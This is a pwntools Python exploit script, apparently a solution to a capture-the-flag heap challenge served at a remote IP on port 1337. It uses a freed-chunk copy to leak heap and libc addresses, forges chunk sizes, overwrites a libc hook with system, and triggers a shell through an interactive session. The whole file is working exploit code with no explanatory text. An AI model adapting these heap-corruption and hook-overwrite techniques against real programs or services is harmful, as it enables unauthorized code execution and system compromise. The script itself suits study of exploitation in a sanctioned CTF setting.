from pwn import *
import sys

remote_ip,port = '69.90.132.248', 1337
binary = './chall'
brkpts = '''

'''

context.terminal=['tmux', 'splitw', '-h']
context.arch = "amd64"

if len(sys.argv)>1:
    io = remote(remote_ip,port)

else:
    io = process(binary, env = {"LD_PRELOAD" : "./libc.so.6"})
    
re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def add(idx,size):
    sla("Choice: ",'1')
    sla("Index: ",str(idx))
    sla("Size: ",str(size))

def edit(idx,data):
    sla("Choice: ",'2')
    sla("Index: ",str(idx))
    sa("Data: ",data)

def copy(id1,id2):
    sla("Choice: ",'3')
    sla("From: ",str(id1))
    sla("To: ",str(id2))

def view(idx):
    sla("Choice: ",'4')
    sla("Index: ",str(idx))
    ru("print: ")
    return rl().replace("\n","")

def free(idx):
    sla("Choice: ",'5')
    sla("Index: ",str(idx))

if __name__== "__main__":
    add(0,0x50)
    add(1,0x50)

    free(1)
    copy(0,0)
    view(0)
    heap = u64(view(0).ljust(8,"\x00"))-0x10
    log.info("heap @ "+hex(heap))

    add(1,0x40)           # fake size
    add(2,0x50)

    payload = "\x00"*0x4f + "\xe1"
    add(3,0x50)
    edit(3,payload)
    free(0)
    free(2)
    add(0,0x78)   # 0
    add(2,0xf0)
    free(1)
    add(1,0xc8)
    payload = p64(0)*8 + p64(0x91) + p64(1)+ p64(0)

    for i in range(7):
        copy(0,0)
        edit(1,payload)

    copy(0,0)
    libc = u64(view(0).ljust(8,"\x00"))-0x1ebbe0
    log.info("libc @ "+str(hex(libc)))

    system = libc+0x55410
    hook = libc+0x1eeb18

    payload = p64(0)*8 + p64(0x91) + p64(hook)+ p64(0)
    edit(1,payload)
    free(2)
    add(4,0x78)
    payload = p64(0)+p64(system)
    add(2,0x78)
    edit(2,payload)
    payload = p64(0)*8 + p64(0x91) + "th;aaaa\x80"
    edit(1,payload)
    #gdb.attach(io)
    free(1)
    io.interactive()